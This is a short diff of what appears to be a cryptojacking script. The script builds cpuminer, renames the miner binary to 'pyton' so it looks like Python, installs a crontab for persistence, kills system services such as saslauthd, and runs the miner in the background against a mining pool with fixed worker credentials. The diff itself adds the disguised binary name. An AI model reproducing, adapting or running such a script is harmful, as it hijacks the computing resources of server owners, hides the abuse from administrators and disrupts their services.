@@ -10,7 +10,7 @@ cd cpuminer
 ./configure CFLAGS="-O3"
 make
 make install
-cp minerd tambang
+cp minerd pyton
 #git clone https://gist.github.com/de81d0e3847e2e334a0e.git
 cd /root/macca/
 crontab Cronmiine
@@ -31,4 +31,4 @@ pkill anytermd
 pkill saslauthd
 service saslauthd stop
 #RUN my girl :)
-/root/macca/cpuminer/tambang -o stratum+tcp://multi.ghash.io:3333 -O alLi1n.worker151:1234gosok -D -B -R 151
+/root/macca/cpuminer/pyton -o stratum+tcp://multi.ghash.io:3333 -O alLi1n.worker151:1234gosok -D -B -R 151
